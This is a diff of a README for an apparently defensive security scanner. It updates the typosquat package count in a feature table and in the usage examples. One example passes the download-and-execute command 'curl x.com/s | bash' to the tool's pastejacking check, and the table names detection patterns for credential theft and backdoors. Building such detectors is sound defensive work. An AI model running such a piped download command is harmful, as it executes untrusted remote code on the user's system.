@@ -44,7 +44,7 @@ Platform:      Linux, macOS (partial)
 | **MBR/GPT** | hlse_protect.c | Boot signature, bootkit strings, obfuscation detection |
 | **Credential leak** | hlse_secrets.c | 39 token patterns — AWS (incl. STS), GitHub, GitLab, Google, npm, OpenAI/Anthropic, Stripe, Shopify, HuggingFace, PyPI, Postman, Square, Doppler, Grafana, Linear, New Relic, Databricks, PlanetScale, HashiCorp Vault, Slack/Discord webhooks, SSH keys, .env passwords (Twilio, SendGrid, Firebase, Cloudflare added; excludes doc/example/placeholder keys to cut false positives); clipboard crypto-swap for 11 chains (BTC/ETH/XMR/SOL/USDT-TRC20/LTC/DOGE/XRP/DASH/XLM/ADA) |
 | **Email forensics** | hlse_secrets.c | SPF/DKIM fail, Reply-To mismatch, display-name spoofing |
-| **Supply chain** | hlse_supply.c | Package typosquat (pip/npm/cargo/go — 213 packages), pastejacking (Unix curl\|sh + Windows ClickFix LOLBins), ARP/DNS safety |
+| **Supply chain** | hlse_supply.c | Package typosquat (pip/npm/cargo/go — 229 packages), pastejacking (Unix curl\|sh + Windows ClickFix LOLBins), ARP/DNS safety |
 | **File masquerade** | hlse_file.c | Double extensions, magic byte mismatch, suspicious filenames |
 | **System audit** | hlse_audit.c | SSH hardening, file permissions, DNS, cron jobs, insecure $PATH, shell-rc backdoors |
 
@@ -56,7 +56,7 @@ make test                               # run all test suites
 ./hlse_core                             # interactive demo
 ./hlse_core "https://g00gle.com"        # scan a URL
 ./hlse_core text "URGENT: wire $5000"   # scan text
-./hlse_core package reqeusts pip        # check for typosquat
+./hlse_core package reqeusts pip        # check for typosquat (229 packages)
 ./hlse_core paste "curl x.com/s | bash" # pastejacking check
 ./hlse_core scan /path/to/project        # recursive secret + file scan (CI/CD)
 ./hlse_core protect /home/user/docs     # ransomware scan
